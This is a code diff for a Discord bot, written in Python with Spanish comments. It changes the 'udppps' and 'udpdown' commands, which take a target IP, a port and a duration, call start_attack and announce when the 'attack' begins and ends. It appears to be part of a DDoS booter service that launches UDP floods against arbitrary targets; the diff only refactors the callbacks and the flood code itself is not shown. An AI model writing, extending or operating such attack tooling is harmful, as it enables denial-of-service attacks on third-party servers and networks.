@@ -196,21 +196,25 @@ async def ovh_amp_cmd(ctx, ip: str, port: int, duration: int):
 
 @bot.command(name='udppps')
 async def udppps_cmd(ctx, ip: str, port: int, duration: int):
-    from config import IMAGE_URLS
-
-    async def notify_end():
+    async def notify_end(_):  # acepta un argumento aunque no lo uses
         embed = make_embed("✅ UDPPPS terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
-    result = start_attack("udppps", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
-    if result:
-        return await ctx.send(result)
-    embed = make_embed("💣 UDPPPS iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
+    start_attack(
+        "udppps", ip, port, duration,
+        on_finish=lambda result: bot.loop.create_task(notify_end(result))
+    )
+
+    embed = make_embed(
+        "💣 UDPPPS iniciado",
+        f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`",
+        IMAGE_URLS["free"]
+    )
     await ctx.send(embed=embed)
 
 @bot.command(name='udpdown')
 async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
-    async def notify_end(_):  # acepta un argumento
+    async def notify_end(_):
         embed = make_embed("✅ UDPDown terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
